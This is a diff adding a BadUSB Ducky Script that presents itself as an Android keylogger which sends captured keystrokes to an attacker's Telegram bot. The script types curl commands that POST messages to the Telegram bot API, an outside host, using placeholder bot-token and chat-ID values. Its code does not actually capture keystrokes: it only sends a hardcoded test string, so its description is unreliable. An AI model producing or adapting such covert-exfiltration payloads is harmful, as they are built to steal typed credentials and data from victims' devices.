@@ -1,0 +1,43 @@
+REM Title: Android Keylogger to Telegram
+REM Author: BadUSB Library
+REM Description: Logs keystrokes and sends to Telegram
+REM Target: Android 7.0+
+REM Category: Authentication
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Browser
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Chrome
+ENTER
+DELAY 3000
+
+REM Navigate to Telegram Web
+STRING https://web.telegram.org
+ENTER
+DELAY 3000
+
+REM Send message
+STRING curl -s -X POST "https://api.telegram.org/botTELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="TELEGRAM_CHAT_ID" -d text="Android Keylogger Connected"
+ENTER
+DELAY 2000
+
+REM Open Notes app
+STRING Notes
+ENTER
+DELAY 2000
+
+REM Type test message
+STRING This is a test message to capture keystrokes
+ENTER
+DELAY 2000
+
+REM Send to Telegram
+STRING curl -s -X POST "https://api.telegram.org/botTELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="TELEGRAM_CHAT_ID" -d text="Keystrokes captured: This is a test message to capture keystrokes"
+ENTER
+DELAY 2000
